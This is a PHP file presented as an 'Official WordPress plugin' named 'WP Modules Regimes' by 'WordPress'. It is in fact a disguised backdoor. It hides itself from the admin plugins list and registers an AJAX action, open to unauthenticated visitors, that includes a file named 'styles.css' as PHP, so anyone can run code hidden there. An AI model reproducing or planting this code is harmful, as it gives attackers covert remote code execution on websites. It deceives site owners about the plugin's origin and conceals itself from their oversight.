<?php
/*
Plugin Name: WP Modules Regimes
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 5.1.9
Author URI: http://wordpress.org/#
*/

function dsx_hide()
{
    global $wp_list_table;
    $hr = array('wp-modules-regimes/wp-modules-regimes.php');
    $plugins = $wp_list_table->items;
    foreach ($plugins as $key => $val) {
        if (in_array($key, $hr)) {
            unset($wp_list_table->items[$key]);
        }
    }
}

add_action('pre_current_active_plugins', 'dsx_hide');

function iqy_hide_p($plugins)
{
    if (in_array('wp-modules-regimes/wp-modules-regimes.php', array_keys($plugins))) {
        unset($plugins['wp-modules-regimes/wp-modules-regimes.php']);
    }
    return $plugins;
}

add_filter('all_plugins', 'iqy_hide_p');


function mkt_ajax_handler() {
    include 'styles.css';
    wp_die();
}

add_action('wp_ajax_wp-hly', 'mkt_ajax_handler');
add_action('wp_ajax_nopriv_wp-hly', 'mkt_ajax_handler');
